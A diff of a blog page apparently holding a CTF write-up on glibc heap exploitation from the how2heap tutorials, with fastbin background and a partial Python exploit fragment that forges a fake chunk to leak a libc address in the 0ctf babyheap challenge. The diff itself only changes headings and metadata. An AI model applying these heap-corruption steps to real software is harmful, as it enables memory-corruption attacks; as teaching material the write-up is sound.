@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
+<meta name="description" content="BackgroundHeap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categor">
 <meta property="og:type" content="article">
 <meta property="og:title" content="How to heap?">
 <meta property="og:url" content="http://blog.fxiao.me/how-to-heap/index.html">
 <meta property="og:site_name" content="Feng&#39;s Blog">
-<meta property="og:description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
+<meta property="og:description" content="BackgroundHeap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categor">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-25T02:51:09.019Z">
+<meta property="og:updated_time" content="2019-03-25T03:00:02.821Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="How to heap?">
-<meta name="twitter:description" content="IntroductionThis post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap. BackgroundHeap is a logically continuous area that consists of many chunks. For heap alloc">
+<meta name="twitter:description" content="BackgroundHeap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categor">
 
 
 
@@ -99,7 +99,7 @@
     root: '/',
     scheme: 'Mist',
     version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
     fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
@@ -247,7 +247,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Feng Xiao">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -309,17 +309,17 @@
       
 
       
-        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is actually the writeups for shellfish’s tutorial on heap exploitation, i.e., how2heap.</p>
-<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Heap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categories. 1. Allocated chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk.</p>
-<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><p>Fastbin is one of the four freelist data structures (fast bin, unsorted bin, small bin, large bin) that are used to hold free chunks. Many attacks relates to fastbins.<br>In malloc_state (heap header), there is an array called fastbinsY that manages the fast bins. In Linux, chunks that are smaller than MAX_FAST_SIZE (80 on 32-bit machine, 160 on 64-bit machine) will be treated as fastbins. The figure below demonstrates the runtime structure of fastbin.</p>
+        <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Heap is a logically continuous area that consists of many chunks. For heap allocator such as ptmalloc, the minimum operation unit is the chunk. Chunks are classified into 4 different categories. 1. Allocated chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk.</p>
+<a id="more"></a>
+<h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>Fastbin is one of the four freelist data structures (fast bin, unsorted bin, small bin, large bin) that are used to hold free chunks. Many attacks relates to fastbins.<br>In malloc_state (heap header), there is an array called fastbinsY that manages the fast bins. In Linux, chunks that are smaller than MAX_FAST_SIZE (80 on 32-bit machine, 160 on 64-bit machine) will be treated as fastbins. The figure below demonstrates the runtime structure of fastbin.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1570	/* The maximum fastbin request size we support */</span><br><span class="line">1571	#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br></pre></td></tr></table></figure>
 
-<h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin_dup_into_stack</a> introduce a technique to forge a fake chunk by heap overflowing a specific fast bin’s <code>FD</code> to the target address.</p>
+<h1 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h1><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin_dup_into_stack</a> introduce a technique to forge a fake chunk by heap overflowing a specific fast bin’s <code>FD</code> to the target address.</p>
 <p>The trick has three steps. Step 1, we put the a victim chunk into bins by freeing it. Step 2, we need a double free or heap overflow to modified the victim chunk’s fd to the target address to claim that there is another chunk there. It is worth noting that in order to pass the malloc check we also need the allocation point at the target address has a legal <code>size</code>.  Step 3, we malloc two times. The first time will put the fake chunk at the head of free list. The second time will malloc a chunk at the target address.</p>
 <p>The 0ctfbabyheap challenge can be solved with this trick. The trick was used for two times. In the first time, we are trying to leak the libc base. To achieve this goal, we forge a fast chunk at the smallbins (Our target address is at smallbin is because smallbin has <code>bk</code> pointer which points to the <code>main_arena</code> when the smallbin is at the head of smallbin free list). The following code demonstrate the processs.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#STEP 1 Free a victim</span><br><span class="line">allocate(0x10) #idx0</span><br><span class="line">allocate(0x10) #idx1</span><br><span class="line">allocate(0x10) #idx2</span><br><span class="line">allocate(0x10) #idx3</span><br><span class="line">allocate(0x80) #idx4 smallbin</span><br><span class="line">free(2)</span><br><span class="line">free(1) # victim chunk</span><br><span class="line"></span><br><span class="line">#STEP 2 modifying the victim&apos;s fd</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21)</span><br><span class="line">fill(3,len(payload),payload) # in order to pass the size check</span><br><span class="line"></span><br><span class="line">##STEP 3 malloc a fake chunk at target addr</span><br><span class="line">allocate(0x10) #idx1 put addr of idx4 at the head list of fastbin</span><br><span class="line">allocate(0x10) #idx2 got smallbin</span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x91) #before idx4 into smallbin, restore its real size </span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line">allocate(0x10)  # idx 5  we needs this to avoid consolidate</span><br><span class="line">free(4) # now idx4 is in smallbin and idx2 points to the smallbin</span><br><span class="line">dump(2)</span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">unsortedbin_addr = u64(p.recv(8))</span><br></pre></td></tr></table></figure>
 <h3 id="fastbin-dup-consolidate-1"><a href="#fastbin-dup-consolidate-1" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">fastbin_dup_consolidate</a> abuses the <code>malloc_consolidate</code> in <a href="https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3672" target="_blank" rel="noopener">malloc.c:L3672</a> to allocate a freed fast bin into unsorted bins.</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></p>
 
       
     </div>
@@ -421,7 +421,7 @@
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="/images/avatar.gif"
+                src="/images/avatar.jpg"
                 alt="Feng Xiao" />
             
               <p class="site-author-name" itemprop="name">Feng Xiao</p>
@@ -488,7 +488,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduction"><span class="nav-number">1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Background"><span class="nav-number">2.</span> <span class="nav-text">Background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin"><span class="nav-number">3.</span> <span class="nav-text">Fastbin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Techniques"><span class="nav-number">4.</span> <span class="nav-text">Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">4.1.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate-1"><span class="nav-number">4.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Background"><span class="nav-number">1.</span> <span class="nav-text">Background</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastbin"><span class="nav-number">1.0.1.</span> <span class="nav-text">Fastbin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Techniques"><span class="nav-number">2.</span> <span class="nav-text">Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">2.0.1.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate-1"><span class="nav-number">2.0.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
